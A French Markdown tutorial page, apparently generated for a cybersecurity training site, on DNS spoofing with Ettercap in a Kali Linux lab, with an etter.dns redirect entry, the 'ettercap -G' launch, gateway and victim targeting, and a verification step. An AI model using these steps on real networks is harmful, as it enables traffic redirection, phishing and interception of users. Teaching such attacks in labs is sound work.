
### **Page Spoofing DNS (`dns-spoofing.md`)**

```markdown
# Spoofing DNS (empoisonnement DNS)

**Objectif** : Rediriger les requêtes DNS des utilisateurs vers des sites malveillants contrôlés par l’attaquant.

**Méthode** : Modifier les réponses DNS pour rediriger les utilisateurs vers des adresses IP choisies par l’attaquant.

## Étapes et Commandes

1. **Configurer le spoofing DNS dans Ettercap** :
   - Modifiez `/etc/ettercap/etter.dns` pour rediriger des requêtes :
     ```plaintext
     example.com    A    192.168.10.50
     *.example.com  A    192.168.10.50
     www.example.com PTR 192.168.10.50
     ```

2. **Lancer Ettercap en mode graphique** :
   ```bash
   sudo ettercap -G
Configurer les cibles dans Ettercap :

Interface eth0, cible 1 : passerelle, cible 2 : victime.
Activer le plugin de spoofing DNS :

Allez dans Plugins > Manage plugins et activez DNS Spoofing.
Résultat Attendu et Vérification
Résultat : Les utilisateurs sont redirigés vers l’adresse de l’attaquant.
Vérification : Sur la machine victime, essayez d’accéder à www.example.com. Le navigateur doit être redirigé vers l’IP de Kali Linux.
yaml
Copy code

---

Ces pages couvrent chaque attaque avec des instructions, des commandes, et des étapes de vérification pour confirmer la réussite. Vous pouvez copier chaque section dans les fichiers Markdown de GitHub pour créer un site complet en cybersécurité.





